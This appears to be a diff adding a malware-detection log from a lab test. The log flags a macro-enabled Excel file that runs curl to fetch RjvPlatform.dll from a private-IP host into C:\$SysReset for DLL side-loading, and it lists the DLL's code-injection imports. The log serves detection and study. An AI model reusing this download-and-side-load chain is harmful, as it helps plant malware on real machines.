@@ -1,0 +1,51 @@
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious URL detected in macro: URL
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious IP detected in macro: IPv4 address
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious executable file detected in macro: Executable file name
+[Thu Jun 12 21:51:53 2025][CRITICAL] Suspicious executable file detected in macro: Executable file name
+[Thu Jun 12 21:51:54 2025][CRITICAL] Process handle.exe-8728 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\Users\null\Downloads\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:51:57 2025][CRITICAL] Executable found in macro: systemresetplatform.exe - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] Executable found in macro: rjvplatform.dll - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] URL found in macro: http//192.168.146.128/rjvplatform.dll - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] IP found in macro: 192.168.146.128 - add to watchlist
+[Thu Jun 12 21:51:57 2025][CRITICAL] File C:\Users\null\Downloads\Win10_Enc_Only.xlsm is malicious (Score: 570)
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process smartscreen.exe-3512 has suspicious command: C:\Windows\System32\smartscreen.exe -Embedding
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process excel.exe-9916 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:08 2025][CRITICAL] Process excel.exe-9916 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:09 2025][CRITICAL] Process excel.exe-9916 is malicious (Score: 70)
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:52:32 2025][CRITICAL] Process excel.exe-9704 is malicious (Score: 70)
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:06 2025][CRITICAL] Process excel.exe-10024 is malicious (Score: 70)
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 is running cmd: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Only.xlsm - contains watchlisted url/ip/file: Win10_Enc_Only.xlsm
+[Thu Jun 12 21:54:16 2025][CRITICAL] Process excel.exe-6296 is malicious (Score: 70)
+[Thu Jun 12 21:54:19 2025][CRITICAL] Process excel.exe-7696 has suspicious command: C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE C:\Users\null\Downloads\CCMD_DA\Win10_Enc_Oly.xlsm
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 has suspicious command: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 is running cmd: curl http://192.168.146.128/RjvPlatform.dll -o C:\$SysReset\Framework\Stack\RjvPlatform.dll - contains watchlisted url/ip/file: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected to watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][CRITICAL] Process curl.exe-8404 is malicious (Score: 70)
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:24 2025][CRITICAL] Malicious C2 communication detected from watchlisted IP: 192.168.146.128
+[Thu Jun 12 21:54:25 2025][CRITICAL] Malicious string found in C:\$SysReset\Framework\Stack\RjvPlatform.dll with plugin imports
+[Thu Jun 12 21:54:25 2025][CRITICAL] Code injection detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'VirtualAllocEx', 'CreateRemoteThread']
+[Thu Jun 12 21:54:25 2025][CRITICAL] Internet access detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['#3', '#22', 'getaddrinfo', '#115', '#116', '#23', '#4', '#16', 'freeaddrinfo', '#19']
+[Thu Jun 12 21:54:25 2025][CRITICAL] Process manipulation detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'Process32NextW', 'Process32FirstW']
+[Thu Jun 12 21:54:26 2025][CRITICAL] Process handle.exe-1660 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:27 2025][CRITICAL] Process systemresetplatform.exe-4284 is in watchlist
+[Thu Jun 12 21:54:27 2025][CRITICAL] Process systemresetplatform.exe-4284 is malicious (Score: 50)
+[Thu Jun 12 21:54:29 2025][CRITICAL] EXE rjvplatform.dll is in watchlist
+[Thu Jun 12 21:54:29 2025][CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[Thu Jun 12 21:54:30 2025][CRITICAL] Malicious string found in C:\$SysReset\Framework\Stack\RjvPlatform.dll with plugin imports
+[Thu Jun 12 21:54:30 2025][CRITICAL] Code injection detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'VirtualAllocEx', 'CreateRemoteThread']
+[Thu Jun 12 21:54:30 2025][CRITICAL] Internet access detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['#3', '#22', 'getaddrinfo', '#115', '#116', '#23', '#4', '#16', 'freeaddrinfo', '#19']
+[Thu Jun 12 21:54:30 2025][CRITICAL] Process manipulation detected in C:\$SysReset\Framework\Stack\RjvPlatform.dll with findings: ['WriteProcessMemory', 'OpenProcess', 'Process32NextW', 'Process32FirstW']
+[Thu Jun 12 21:54:31 2025][CRITICAL] Process handle.exe-6852 has suspicious command: C:\Users\null\Downloads\CCMD_DA\SYSINTERNAL\handle.exe -nobanner -accepteula -a -u -v -g C:\$SysReset\Framework\Stack\RjvPlatform.dll
+[Thu Jun 12 21:54:34 2025][CRITICAL] EXE rjvplatform.dll is in watchlist
+[Thu Jun 12 21:54:34 2025][CRITICAL] File C:\$SysReset\Framework\Stack\RjvPlatform.dll is malicious (Score: 220)
+[Thu Jun 12 21:56:47 2025][CRITICAL] Process microsoftedgeupdate.exe-7688 has suspicious command: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /ua /installsource scheduler
+[Thu Jun 12 21:57:22 2025][CRITICAL] Process python.exe-6700 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py stop
+[Thu Jun 12 21:57:36 2025][CRITICAL] Process python.exe-7524 has suspicious command: C:\Users\null\AppData\Local\Programs\Python\Python313\python.exe C:\Users\null\Downloads\CCMD_DA\MonitorMalwareService.py remove
